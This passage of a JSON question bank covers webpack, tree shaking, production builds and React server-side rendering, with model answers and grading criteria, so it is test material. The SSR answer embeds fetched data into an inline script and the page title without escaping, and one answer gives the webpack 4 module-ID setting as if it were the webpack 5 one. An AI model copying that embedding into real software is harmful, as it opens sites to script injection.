            "optimization",
            "bundle-size",
            "tree-shaking",
            "code-splitting"
          ],
          "prerequisites": [
            "webpack_basics",
            "tree_shaking",
            "code_splitting"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_bundle_analyzer_4",
          "topic": "Webpack Bundle Analyzer",
          "level": "hard",
          "type": "code",
          "question": "You want to configure `webpack-bundle-analyzer` to generate a static HTML report without opening a browser automatically, suitable for a CI/CD pipeline. Modify the following `webpack.config.js` to achieve this, saving the report as `bundle-report.html` in the `dist` folder.",
          "answer": "```javascript\nconst path = require('path');\nconst BundleAnalyzerPlugin = require('webpack-bundle-analyzer').BundleAnalyzerPlugin;\n\nmodule.exports = {\n  mode: 'production',\n  entry: './src/index.js',\n  output: {\n    path: path.resolve(__dirname, 'dist'),\n    filename: 'bundle.js',\n  },\n  plugins: [\n    new BundleAnalyzerPlugin({\n      analyzerMode: 'static',      // Generate a static HTML file\n      openAnalyzer: false,         // Prevent opening the browser automatically\n      reportFilename: path.resolve(__dirname, 'dist', 'bundle-report.html') // Specify output path and filename\n    })\n  ]\n};\n```",
          "options": [],
          "analysisPoints": [
            "Knowledge of `webpack-bundle-analyzer` configuration options.",
            "Ability to apply specific configurations for different environments (e.g., CI/CD).",
            "Correct usage of Node.js `path` module for file paths."
          ],
          "keyConcepts": [
            "Webpack",
            "Bundle Analyzer",
            "CI/CD",
            "Configuration"
          ],
          "evaluationCriteria": [
            "Accuracy of plugin configuration.",
            "Understanding of `analyzerMode` and `openAnalyzer` options.",
            "Correct path handling for `reportFilename`."
          ],
          "example": "The key to this task is knowing the `analyzerMode`, `openAnalyzer`, and `reportFilename` options for the `BundleAnalyzerPlugin`. `analyzerMode: 'static'` ensures an HTML file is generated, `openAnalyzer: false` prevents automatic browser launch, and `reportFilename` defines the output path and name for the report, which should be within the `dist` directory.",
          "tags": [
            "webpack",
            "tooling",
            "configuration",
            "ci-cd"
          ],
          "prerequisites": [
            "webpack_basics",
            "node.js_path"
          ],
          "complexity": 7,
          "interviewFrequency": 7,
          "learningPath": "advanced"
        },
        {
          "id": "question_tree_shaking_1",
          "topic": "Tree Shaking",
          "level": "easy",
          "type": "flashcard",
          "question": "What is another common name for 'Tree Shaking'?",
          "answer": "Dead Code Elimination.",
          "options": [],
          "analysisPoints": [
            "Basic terminology recall.",
            "Understanding of fundamental webpack optimizations."
          ],
          "keyConcepts": [
            "Tree Shaking",
            "Dead Code Elimination",
            "Optimization"
          ],
          "evaluationCriteria": [
            "Ability to recall related terms"
          ],
          "example": "",
          "tags": [
            "webpack",
            "performance",
            "optimization"
          ],
          "prerequisites": [],
          "complexity": 2,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_tree_shaking_2",
          "topic": "Tree Shaking",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following `my-utils.js` and `index.js` files:\n\n`my-utils.js`:\n```javascript\nexport function funcA() { return 'A'; }\nexport function funcB() { return 'B'; }\nexport function funcC() { console.log('Side effect C'); return 'C'; }\n```\n\n`index.js`:\n```javascript\nimport { funcA } from './my-utils';\nconst result = funcA();\nconsole.log(result);\n```\n\nIf Webpack is configured for production mode with tree shaking, which function(s) will likely be included in the final bundle?",
          "answer": "Only `funcA`.",
          "options": [
            "Only `funcA`.",
            "`funcA` and `funcB`.",
            "`funcA`, `funcB`, and `funcC`.",
            "None of the functions, as `funcC` has a side effect."
          ],
          "analysisPoints": [
            "Understanding how tree shaking works with ES modules.",
            "Identifying used vs. unused exports.",
            "Recognizing that `console.log` within `funcC` is a side effect, but `funcC` itself would still be eliminated if unused and the module is marked side-effect free."
          ],
          "keyConcepts": [
            "Tree Shaking",
            "ES Modules",
            "Dead Code Elimination",
            "Side Effects"
          ],
          "evaluationCriteria": [
            "Correctly applying tree shaking principles.",
            "Distinguishing between module-level side effects and function-level side effects."
          ],
          "example": "Tree shaking works by identifying exports that are *not imported* anywhere in the dependency graph. Since only `funcA` is imported in `index.js`, `funcB` and `funcC` (despite `funcC` having an internal side effect) will be eliminated from the bundle, assuming `my-utils.js` or the entire project is configured as side-effect free.",
          "tags": [
            "webpack",
            "tree-shaking",
            "es-modules",
            "optimization"
          ],
          "prerequisites": [
            "javascript_modules"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_tree_shaking_3",
          "topic": "Tree Shaking",
          "level": "medium",
          "type": "open",
          "question": "Explain why `import lodash from 'lodash';` is generally less optimal for tree shaking compared to `import { chunk } from 'lodash-es';` or `import chunk from 'lodash/chunk';`.",
          "answer": "The primary reason is the module system used. When you use `import lodash from 'lodash';`, you are typically importing the CommonJS (CJS) build of `lodash`. CommonJS modules are dynamic, meaning a bundler cannot statically determine which parts of the `lodash` object (`lodash.chunk`, `lodash.map`, etc.) will actually be used at compile time. Therefore, the entire `lodash` library is included in the bundle.\n\nConversely, `import { chunk } from 'lodash-es';` or `import chunk from 'lodash/chunk';` leverages ES Modules (ESM) syntax. ESM imports are static, allowing bundlers like Webpack to perform 'dead code elimination' (tree shaking). The bundler can analyze that only the `chunk` export is used and therefore includes only that specific function (and its dependencies) in the final bundle, discarding all other unused `lodash` functions. `lodash-es` specifically provides an ESM-compatible build, and `lodash/chunk` directly imports the ES module for the `chunk` function.",
          "options": [],
          "analysisPoints": [
            "Understanding the difference between CommonJS and ES Modules regarding static analysis.",
            "Explaining how bundlers leverage ESM for tree shaking.",
            "Providing concrete examples of good vs. bad import practices."
          ],
          "keyConcepts": [
            "Tree Shaking",
            "ES Modules",
            "CommonJS",
            "Static Analysis",
            "Bundle Size"
          ],
          "evaluationCriteria": [
            "Clarity and accuracy of explanation.",
            "Demonstration of deep understanding of module systems.",
            "Ability to connect concepts to practical optimization."
          ],
          "example": "",
          "tags": [
            "tree-shaking",
            "es-modules",
            "commonjs",
            "webpack",
            "optimization",
            "javascript"
          ],
          "prerequisites": [
            "javascript_modules"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_tree_shaking_4",
          "topic": "Tree Shaking",
          "level": "hard",
          "type": "mcq",
          "question": "Which of the following is NOT a common prerequisite or configuration step for effective tree shaking in a webpack project?\n\nA. Using ES module syntax (`import`/`export`) throughout your codebase and dependencies.\nB. Ensuring modules are marked as 'side-effect free' where appropriate (e.g., via `package.json`'s `sideEffects` field).\nC. Configuring a minifier like `TerserPlugin` to remove unused code.\nD. Setting `optimization.usedExports` to `false` in webpack configuration.",
          "answer": "D. Setting `optimization.usedExports` to `false` in webpack configuration.",
          "options": [
            "A. Using ES module syntax (`import`/`export`) throughout your codebase and dependencies.",
            "B. Ensuring modules are marked as 'side-effect free' where appropriate (e.g., via `package.json`'s `sideEffects` field).",
            "C. Configuring a minifier like `TerserPlugin` to remove unused code.",
            "D. Setting `optimization.usedExports` to `false` in webpack configuration."
          ],
          "analysisPoints": [
            "Understanding the core requirements for tree shaking.",
            "Identifying correct webpack optimization settings.",
            "Distinguishing between enabling and disabling features."
          ],
          "keyConcepts": [
            "Tree Shaking",
            "ES Modules",
            "Side Effects",
            "Minification",
            "Webpack Optimization"
          ],
          "evaluationCriteria": [
            "Comprehensive knowledge of tree shaking prerequisites.",
            "Accuracy in identifying incorrect configuration.",
            "Understanding of webpack's `optimization.usedExports`."
          ],
          "example": "`optimization.usedExports` (which is enabled by default in `production` mode) is responsible for marking unused exports in the bundle, allowing the minifier (like Terser) to actually remove them. Setting it to `false` would disable this essential part of tree shaking, hence it's not a prerequisite for *effective* tree shaking.",
          "tags": [
            "webpack",
            "tree-shaking",
            "optimization",
            "configuration",
            "performance"
          ],
          "prerequisites": [
            "webpack_optimization"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_tree_shaking_5",
          "topic": "Tree Shaking",
          "level": "medium",
          "type": "flashcard",
          "question": "What role does the `\"sideEffects\": false` property in `package.json` play in tree shaking?",
          "answer": "It informs webpack that all modules within the package are 'side-effect free', meaning they don't perform actions beyond exporting values (e.g., global variable modification, console logs at module level). This allows webpack to safely remove unused exports without concern for breaking functionality.",
          "options": [],
          "analysisPoints": [
            "Understanding of `sideEffects` property.",
            "Connecting it to safe code elimination."
          ],
          "keyConcepts": [
            "Tree Shaking",
            "Side Effects",
            "package.json",
            "Webpack"
          ],
          "evaluationCriteria": [
            "Ability to explain the purpose of `sideEffects` in context of tree shaking"
          ],
          "example": "",
          "tags": [
            "webpack",
            "tree-shaking",
            "package.json",
            "optimization"
          ],
          "prerequisites": [
            "webpack_optimization"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_tree_shaking_6",
          "topic": "Tree Shaking",
          "level": "medium",
          "type": "open",
          "question": "Describe a scenario where tree shaking might not work as expected, even with ES Modules, and suggest a solution.",
          "answer": "One common scenario where tree shaking might not work as expected is when a module or library has **side effects** that prevent it from being safely removed, even if its exports are unused. For instance, a library might register a global polyfill, modify a DOM element, or log something upon import. If webpack doesn't know that such a module is side-effect free, it will err on the side of caution and include it.\n\n**Example:**\n```javascript\n// library.js\nconsole.log('This module initializes on import!'); // Side effect\nexport function funcA() { /* ... */ }\nexport function funcB() { /* ... */ }\n\n// app.js\nimport { funcA } from './library'; // Only funcA is used\n```\nEven if `funcB` is not used, the `console.log` statement in `library.js` makes the entire module potentially have side effects. If webpack isn't explicitly told otherwise, it might include the entire `library.js` module.\n\n**Solution:**\nTo address this, the library author (or you, if it's your code) can specify `\"sideEffects\": false` in the `package.json` for that package (if the whole package is side-effect free) or use an array of paths that contain side effects (e.g., `\"sideEffects\": [\"./src/polyfills.js\"]`). This explicit declaration tells webpack that modules *not* listed as having side effects can be safely tree-shaken if their exports are unused. If the module genuinely has necessary side effects, then it cannot be fully tree-shaken, and you might need to reconsider its usage or break it down into smaller, side-effect-free parts.",
          "options": [],
          "analysisPoints": [
            "Identifying edge cases for tree shaking.",
            "Understanding the concept of 'side effects' in modules.",
            "Proposing practical solutions using `package.json`'s `sideEffects` field."
          ],
          "keyConcepts": [
            "Tree Shaking",
            "Side Effects",
            "Webpack",
            "Module Bundling",
            "Optimization"
          ],
          "evaluationCriteria": [
            "Depth of understanding of tree shaking mechanics.",
            "Ability to diagnose and solve optimization issues.",
            "Knowledge of `sideEffects` configuration."
          ],
          "example": "",
          "tags": [
            "webpack",
            "tree-shaking",
            "optimization",
            "side-effects",
            "javascript"
          ],
          "prerequisites": [
            "tree_shaking_theory"
          ],
          "complexity": 8,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_webpack_prod_config_1",
          "topic": "Webpack Production Configuration",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary benefit of using `[contenthash]` in webpack output filenames for production builds?",
          "answer": "Enables long-term caching for static assets by invalidating the cache only when the file's content changes.",
          "options": [],
          "analysisPoints": [
            "Understanding of caching strategies.",
            "Recognition of hash types in webpack."
          ],
          "keyConcepts": [
            "Webpack",
            "Caching",
            "Contenthash",
            "Performance"
          ],
          "evaluationCriteria": [
            "Ability to recall caching benefits of contenthash"
          ],
          "example": "",
          "tags": [
            "webpack",
            "caching",
            "performance"
          ],
          "prerequisites": [
            "webpack_basics"
          ],
          "complexity": 4,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_webpack_prod_config_2",
          "topic": "Webpack Production Configuration",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following webpack `optimization` configurations is primarily responsible for splitting vendor code (from `node_modules`) into a separate chunk?",
          "answer": "`splitChunks.cacheGroups.vendor`",
          "options": [
            "`minimize: true`",
            "`runtimeChunk: 'single'`",
            "`splitChunks.cacheGroups.vendor`",
            "`TerserPlugin`"
          ],
          "analysisPoints": [
            "Understanding different webpack optimization features.",
            "Identifying the specific configuration for code splitting by vendor.",
            "Distinguishing between minification, runtime chunking, and code splitting."
          ],
          "keyConcepts": [
            "Webpack",
            "Code Splitting",
            "Optimization",
            "Vendor Bundling"
          ],
          "evaluationCriteria": [
            "Accurate identification of webpack configuration purpose.",
            "Knowledge of `splitChunks` options."
          ],
          "example": "The `splitChunks` configuration within the `optimization` object is used for code splitting. Specifically, `cacheGroups` allow defining rules for grouping modules into chunks. The `vendor` cache group, often defined with a `test: /[\\\\/]node_modules[\\\\/]/` regex, is standard for isolating third-party libraries.",
          "tags": [
            "webpack",
            "code-splitting",
            "optimization",
            "performance"
          ],
          "prerequisites": [
            "webpack_optimization"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_webpack_prod_config_3",
          "topic": "Webpack Production Configuration",
          "level": "medium",
          "type": "open",
          "question": "Explain the purpose of `runtimeChunk: 'single'` in a webpack production configuration and how it contributes to caching strategies.",
          "answer": "`runtimeChunk: 'single'` in webpack's `optimization` configuration tells webpack to extract the webpack runtime and manifest into a separate, single chunk. The webpack runtime contains the code necessary to load and execute other chunks, including information about module IDs and chunk mappings (the manifest).\n\n**Contribution to Caching:**\nWithout `runtimeChunk: 'single'`, the manifest (which changes frequently due to new builds, module additions/deletions, or even just changes to module order) would be embedded within one of your application bundles (e.g., the entry chunk or a vendor chunk). If the manifest changes, the `contenthash` of that entire bundle would also change, forcing browsers to re-download the entire bundle, even if the actual application code within it hasn't changed.\n\nBy isolating the runtime into its own chunk, only *that* small runtime chunk needs to be re-downloaded when the manifest changes. All other application and vendor chunks, whose `contenthash` depends only on their actual content, will remain stable in the browser cache as long as their source code doesn't change. This significantly improves long-term caching effectiveness and reduces data transfer on subsequent visits.",
          "options": [],
          "analysisPoints": [
            "Understanding webpack's runtime concept.",
            "Explaining the interaction between runtime, manifest, and content hashing.",
            "Clearly articulating the caching benefit."
          ],
          "keyConcepts": [
            "Webpack",
            "Caching",
            "Runtime Chunk",
            "Contenthash",
            "Optimization"
          ],
          "evaluationCriteria": [
            "Accuracy and depth of technical explanation.",
            "Ability to connect configuration to performance impact.",
            "Clarity of communication."
          ],
          "example": "",
          "tags": [
            "webpack",
            "caching",
            "optimization",
            "performance"
          ],
          "prerequisites": [
            "webpack_optimization",
            "caching_basics"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_webpack_prod_config_4",
          "topic": "Webpack Production Configuration",
          "level": "hard",
          "type": "code",
          "question": "A production webpack configuration needs to ensure that: \n1. CSS is extracted into separate files with content hashing.\n2. JavaScript and CSS files are minified.\n3. Pre-compressed Gzip files are generated for both JS and CSS.\n4. Module IDs are stable across builds to prevent cache invalidation due to minor changes.\n\nModify the following partial `webpack.config.js` to implement these requirements. Assume `MiniCssExtractPlugin`, `CssMinimizerPlugin`, `TerserPlugin`, and `CompressionPlugin` are already installed.",
          "answer": "```javascript\nconst path = require('path');\nconst webpack = require('webpack');\nconst MiniCssExtractPlugin = require('mini-css-extract-plugin');\nconst CssMinimizerPlugin = require('css-minimizer-webpack-plugin');\nconst TerserPlugin = require('terser-webpack-plugin');\nconst CompressionPlugin = require('compression-webpack-plugin');\n\nmodule.exports = {\n  mode: 'production',\n  entry: './src/index.js',\n  output: {\n    path: path.resolve(__dirname, 'dist'),\n    filename: '[name].[contenthash].js',\n    chunkFilename: '[name].[contenthash].chunk.js',\n  },\n  module: {\n    rules: [\n      {\n        test: /\\.css$/,\n        use: [MiniCssExtractPlugin.loader, 'css-loader'],\n      },\n      {\n        test: /\\.js$/,\n        exclude: /node_modules/,\n        use: 'babel-loader',\n      },\n    ],\n  },\n  optimization: {\n    minimize: true,\n    minimizer: [\n      new TerserPlugin(),   // For JavaScript minification\n      new CssMinimizerPlugin(), // For CSS minification\n    ],\n    // Ensure usedExports is true (default in production) for tree shaking\n    // runtimeChunk: 'single' // Also good practice, but not explicitly requested for this question\n  },\n  plugins: [\n    new MiniCssExtractPlugin({\n      filename: '[name].[contenthash].css', // 1. CSS extracted with content hash\n    }),\n    new CompressionPlugin(), // 3. Generates .gz files for JS, CSS (default test regex covers them)\n    new webpack.ids.HashedModuleIdsPlugin(), // 4. Stable module IDs\n    // Note: TerserPlugin and CssMinimizerPlugin are placed in optimization.minimizer\n  ],\n};\n```",
          "options": [],
          "analysisPoints": [
            "Correctly configuring `MiniCssExtractPlugin` with `[contenthash]`.",
            "Placing `TerserPlugin` and `CssMinimizerPlugin` in `optimization.minimizer`.",
            "Including `CompressionPlugin` for pre-compression.",
            "Adding `webpack.ids.HashedModuleIdsPlugin` for stable module IDs.",
            "Understanding the roles of different plugins and optimization settings."
          ],
          "keyConcepts": [
            "Webpack",
            "Plugins",
            "Optimization",
            "Minification",
            "Caching",
            "Compression",
            "CSS Extraction"
          ],
          "evaluationCriteria": [
            "Accuracy in implementing all four requirements.",
            "Correct placement of plugins and optimization options.",
            "Demonstration of comprehensive webpack configuration knowledge."
          ],
          "example": "The solution leverages key webpack features for production. `MiniCssExtractPlugin` handles CSS extraction, with `[contenthash]` for caching. `TerserPlugin` and `CssMinimizerPlugin` are correctly placed in `optimization.minimizer` for minification. `CompressionPlugin` is added to `plugins` for generating compressed assets. Finally, `webpack.ids.HashedModuleIdsPlugin` is included to stabilize module IDs, which is crucial for cache invalidation strategies.",
          "tags": [
            "webpack",
            "configuration",
            "optimization",
            "performance",
            "plugins",
            "caching"
          ],
          "prerequisites": [
            "webpack_plugins",
            "webpack_optimization"
          ],
          "complexity": 9,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_webpack_prod_config_5",
          "topic": "Webpack Production Configuration",
          "level": "medium",
          "type": "flashcard",
          "question": "What is the primary function of `CompressionPlugin` in a webpack build?",
          "answer": "To pre-compress webpack assets (like JS, CSS, HTML) using algorithms like Gzip or Brotli, allowing web servers to serve smaller, pre-compressed files and reduce client download times.",
          "options": [],
          "analysisPoints": [
            "Understanding of asset compression.",
            "Benefits for network performance."
          ],
          "keyConcepts": [
            "Webpack",
            "Compression",
            "Performance",
            "Optimization"
          ],
          "evaluationCriteria": [
            "Ability to explain `CompressionPlugin`'s role"
          ],
          "example": "",
          "tags": [
            "webpack",
            "performance",
            "optimization",
            "compression"
          ],
          "prerequisites": [],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_webpack_prod_config_6",
          "topic": "Webpack Production Configuration",
          "level": "medium",
          "type": "mcq",
          "question": "You observe that even after small changes to a single application file, your entire `vendor.js` bundle's hash changes, causing users to re-download it. Which webpack configuration option or plugin is most likely missing or misconfigured to prevent this issue?",
          "answer": "`webpack.ids.HashedModuleIdsPlugin` (or `optimization.moduleIds: 'hashed'` in webpack 5)",
          "options": [
            "`mode: 'production'`",
            "`optimization.splitChunks.chunks: 'all'`",
            "`webpack.ids.HashedModuleIdsPlugin` (or `optimization.moduleIds: 'hashed'` in webpack 5)",
            "`MiniCssExtractPlugin`"
          ],
          "analysisPoints": [
            "Diagnosing caching issues related to module IDs.",
            "Knowledge of webpack's module ID generation and stabilization.",
            "Distinguishing between general optimization and specific ID stabilization."
          ],
          "keyConcepts": [
            "Webpack",
            "Caching",
            "Module IDs",
            "HashedModuleIdsPlugin",
            "Performance"
          ],
          "evaluationCriteria": [
            "Correctly identifying the root cause of the caching problem.",
            "Knowledge of specific webpack solutions for module ID stability."
          ],
          "example": "When module IDs are not stable (e.g., they are numeric and assigned based on build order), adding or removing a new module can shift the IDs of all subsequent modules. This change in ID, even if the module's content hasn't changed, would cause its hash to change if the hash includes the ID. `webpack.ids.HashedModuleIdsPlugin` (or `optimization.moduleIds: 'hashed'`) solves this by hashing module IDs based on their content, making them stable across builds.",
          "tags": [
            "webpack",
            "caching",
            "optimization",
            "module-ids",
            "troubleshooting"
          ],
          "prerequisites": [
            "webpack_optimization",
            "caching_basics"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_webpack_prod_config_7",
          "topic": "Webpack Production Configuration",
          "level": "hard",
          "type": "open",
          "question": "A developer argues that setting `optimization.maxInitialRequests` to `Infinity` in `splitChunks` for an application served over HTTP/1.1 is always a good idea for performance. Do you agree? Justify your answer, considering both HTTP/1.1 and HTTP/2 implications.",
          "answer": "I would **disagree** with the statement that setting `optimization.maxInitialRequests` to `Infinity` is *always* a good idea, especially for an application served over **HTTP/1.1**.\n\n**HTTP/1.1 Implications:**\n*   HTTP/1.1 has a limitation on the number of concurrent requests (typically 6-8 per domain). If `maxInitialRequests` is set to `Infinity`, webpack will generate as many initial chunks as possible, potentially leading to a large number of small network requests.\n*   Under HTTP/1.1, these numerous requests would block each other, leading to increased overhead from connection setup/teardown for each request, Head-of-Line Blocking, and overall slower page load times due to serial loading of too many assets.\n*   For HTTP/1.1, it's generally better to have a moderate number of larger chunks (e.g., 2-5) to optimize for the limited parallelism, balancing the benefits of code splitting with the overhead of too many requests.\n\n**HTTP/2 Implications:**\n*   HTTP/2 supports multiplexing, allowing multiple requests and responses to be sent concurrently over a single TCP connection. This significantly reduces the overhead associated with many small requests.\n*   Therefore, setting `maxInitialRequests` to `Infinity` can be a **good strategy** for applications served over HTTP/2, as it fully leverages the protocol's capabilities for parallel loading and finer-grained caching (smaller, more independent chunks are less likely to change). This allows for maximum code splitting benefit without the performance penalty seen in HTTP/1.1.\n\n**Conclusion:**\nThe optimal value for `maxInitialRequests` is highly dependent on the serving protocol. While `Infinity` is excellent for HTTP/2, it can be detrimental for HTTP/1.1. Developers should analyze their deployment environment and target audience's browser support to make an informed decision.",
          "options": [],
          "analysisPoints": [
            "Understanding of HTTP/1.1 and HTTP/2 differences.",
            "Knowledge of `splitChunks` options and their impact on network performance.",
            "Ability to analyze a statement critically and provide nuanced justification.",
            "Connecting webpack configuration to underlying web protocols."
          ],
          "keyConcepts": [
            "Webpack",
            "Code Splitting",
            "HTTP/1.1",
            "HTTP/2",
            "Performance Optimization",
            "Networking"
          ],
          "evaluationCriteria": [
            "Accuracy of protocol knowledge.",
            "Thoroughness of explanation regarding the impact of `maxInitialRequests`.",
            "Ability to articulate a well-reasoned argument.",
            "Practical application of performance principles."
          ],
          "example": "",
          "tags": [
            "webpack",
            "performance",
            "networking",
            "http",
            "code-splitting",
            "optimization"
          ],
          "prerequisites": [
            "webpack_optimization",
            "http_protocols"
          ],
          "complexity": 9,
          "interviewFrequency": 9,
          "learningPath": "expert"
        },
        {
          "id": "question_webpack_prod_config_8",
          "topic": "Webpack Production Configuration",
          "level": "medium",
          "type": "flashcard",
          "question": "What is the main benefit of using `MiniCssExtractPlugin` in a webpack production build, compared to including CSS directly in JavaScript bundles?",
          "answer": "It extracts CSS into separate `.css` files, allowing browsers to load CSS asynchronously and in parallel with JavaScript, preventing Flash of Unstyled Content (FOUC) and improving initial render performance.",
          "options": [],
          "analysisPoints": [
            "Understanding of CSS loading best practices.",
            "Knowledge of FOUC and its prevention."
          ],
          "keyConcepts": [
            "Webpack",
            "CSS Optimization",
            "Performance",
            "FOUC"
          ],
          "evaluationCriteria": [
            "Ability to explain `MiniCssExtractPlugin`'s advantage"
          ],
          "example": "",
          "tags": [
            "webpack",
            "css",
            "performance",
            "plugin"
          ],
          "prerequisites": [],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_ssr_1",
          "topic": "Server-Side Rendering (SSR)",
          "level": "easy",
          "type": "flashcard",
          "question": "What does SSR stand for?",
          "answer": "Server-Side Rendering.",
          "options": [],
          "analysisPoints": [
            "Basic terminology recall."
          ],
          "keyConcepts": [
            "SSR"
          ],
          "evaluationCriteria": [
            "Ability to recall abbreviation"
          ],
          "example": "",
          "tags": [
            "ssr",
            "fundamentals"
          ],
          "prerequisites": [],
          "complexity": 1,
          "interviewFrequency": 5,
          "learningPath": "beginner"
        },
        {
          "id": "question_ssr_2",
          "topic": "Server-Side Rendering (SSR)",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following is NOT a primary benefit of using Server-Side Rendering for a Single Page Application (SPA)?",
          "answer": "Reduced server load and complexity.",
          "options": [
            "Improved SEO for search engine crawlers.",
            "Faster Time to First Contentful Paint (FCP).",
            "Better user experience on slower networks.",
            "Reduced server load and complexity."
          ],
          "analysisPoints": [
            "Understanding the trade-offs of SSR.",
            "Identifying common misconceptions about SSR benefits."
          ],
          "keyConcepts": [
            "SSR",
            "SEO",
            "Performance",
            "Server Load"
          ],
          "evaluationCriteria": [
            "Accurate knowledge of SSR advantages and disadvantages.",
            "Ability to distinguish between client-side and server-side rendering characteristics."
          ],
          "example": "SSR generally *increases* server load and adds complexity because the server now has to render the application for each request. Benefits like improved SEO, faster FCP, and better user experience are indeed primary advantages.",
          "tags": [
            "ssr",
            "performance",
            "seo",
            "architecture"
          ],
          "prerequisites": [
            "ssr_basics"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_ssr_3",
          "topic": "Server-Side Rendering (SSR)",
          "level": "medium",
          "type": "open",
          "question": "Explain the concept of 'hydration' in the context of React Server-Side Rendering. Why is it important?",
          "answer": "In React Server-Side Rendering, 'hydration' is the process where the client-side JavaScript takes over the HTML that was initially rendered by the server. When the browser receives the server-rendered HTML, it displays the content immediately (fast 'first paint'). However, this initial HTML is static and non-interactive.\n\nOnce the client-side JavaScript bundles (containing React) are downloaded and executed, React scans the existing DOM (created by the server) and attaches event listeners, sets up component state, and makes the application interactive. Instead of re-rendering the entire component tree from scratch (which would cause a flicker and wasted work), React 'hydrates' the pre-existing server-rendered markup, bringing it to life.\n\n**Importance:**\n*   **Seamless Transition:** It provides a smooth transition from a static server-rendered page to a fully interactive client-side application without a noticeable re-render.\n*   **Performance:** It avoids the double-rendering problem, where the client would first re-create the DOM, then update it. Hydration is more efficient as it reuses the server-generated DOM.\n*   **User Experience:** Ensures that content is visible quickly while interactivity becomes available shortly after, combining the benefits of static pages with the richness of SPAs.",
          "options": [],
          "analysisPoints": [
            "Clear definition of hydration.",
            "Explanation of the process (server-to-client transition).",
            "Articulating the benefits of hydration (performance, UX, seamlessness)."
          ],
          "keyConcepts": [
            "SSR",
            "Hydration",
            "React",
            "Performance",
            "User Experience"
          ],
          "evaluationCriteria": [
            "Accuracy and completeness of explanation.",
            "Understanding of the client-server interaction in SSR.",
            "Clarity of the concept's importance."
          ],
          "example": "",
          "tags": [
            "ssr",
            "react",
            "hydration",
            "performance",
            "client-server"
          ],
          "prerequisites": [
            "react_basics",
            "ssr_basics"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_ssr_4",
          "topic": "Server-Side Rendering (SSR)",
          "level": "hard",
          "type": "code",
          "question": "Given the following React component:\n\n`src/PostDetail.js`:\n```javascript\nimport React, { useState, useEffect } from 'react';\n\nfunction PostDetail({ postId, initialPostData }) {\n  const [post, setPost] = useState(initialPostData);\n  const [loading, setLoading] = useState(!initialPostData);\n\n  useEffect(() => {\n    if (!initialPostData) {\n      setLoading(true);\n      fetch(`/api/posts/${postId}`)\n        .then(res => res.json())\n        .then(data => {\n          setPost(data);\n          setLoading(false);\n        });\n    }\n  }, [postId, initialPostData]);\n\n  if (loading) {\n    return <div>Loading post...</div>;\n  }\n\n  if (!post) {\n    return <div>Post not found.</div>;\n  }\n\n  return (\n    <div>\n      <h1>{post.title}</h1>\n      <p>{post.content}</p>\n    </div>\n  );\n}\n\nexport default PostDetail;\n```\n\nModify the `server.js` Express route to perform server-side data fetching for `PostDetail` before rendering, embedding the fetched data into the HTML for client hydration. Assume `fetch` is available on the server (e.g., via `node-fetch`).",
          "answer": "```javascript\n// server.js\nimport express from 'express';\nimport React from 'react';\nimport { renderToString } from 'react-dom/server';\nimport PostDetail from './src/PostDetail'; // Assuming PostDetail is the root component\nimport path from 'path';\nimport fetch from 'node-fetch'; // Assuming node-fetch is installed for server-side fetch\n\nconst app = express();\n\napp.use(express.static(path.resolve(__dirname, 'dist'))); // Serve static client bundle\n\napp.get('/posts/:id', async (req, res) => {\n  const postId = req.params.id;\n  let initialPostData = null;\n\n  try {\n    // Simulate server-side data fetching\n    const response = await fetch(`http://localhost:3000/api/posts/${postId}`); // Adjust URL as needed\n    if (response.ok) {\n      initialPostData = await response.json();\n    } else {\n      // Handle cases where post is not found or API error\n      console.error(`Error fetching post ${postId}: ${response.status}`);\n    }\n  } catch (error) {\n    console.error('Server-side data fetch error:', error);\n  }\n\n  // Render the React component with initial data\n  const html = renderToString(\n    <PostDetail postId={postId} initialPostData={initialPostData} />\n  );\n  \n  // Embed initial data into the HTML for client hydration\n  const initialDataScript = initialPostData \n    ? `<script>window.__INITIAL_DATA__ = ${JSON.stringify(initialPostData)};</script>`\n    : `<script>window.__INITIAL_DATA__ = null;</script>`;\n\n  res.send(`\n    <!DOCTYPE html>\n    <html>\n      <head>\n        <title>${initialPostData ? initialPostData.title : 'Post'}</title>\n      </head>\n      <body>\n        <div id=\"root\">${html}</div>\n        ${initialDataScript}\n        <script src=\"/bundle.js\"></script>\n      </body>\n    </html>\n  `);\n});\n\n// Example API endpoint for testing data fetching\napp.get('/api/posts/:id', (req, res) => {\n  const id = req.params.id;\n  if (id === '123') {\n    res.json({ id: '123', title: 'My First SSR Post', content: 'This content was rendered on the server!' });\n  } else {\n    res.status(404).json({ message: 'Post not found' });\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server is listening on port 3000');\n});\n\n// src/index.js (Client-side hydration for PostDetail)\nimport React from 'react';\nimport ReactDOM from 'react-dom/client';\nimport PostDetail from './PostDetail';\n\n// Assuming the postId comes from the URL, or similar context\n// For a real app, you'd parse the URL or pass it from a higher component.\nconst postIdFromUrl = window.location.pathname.split('/').pop(); // Basic example\n\nconst root = 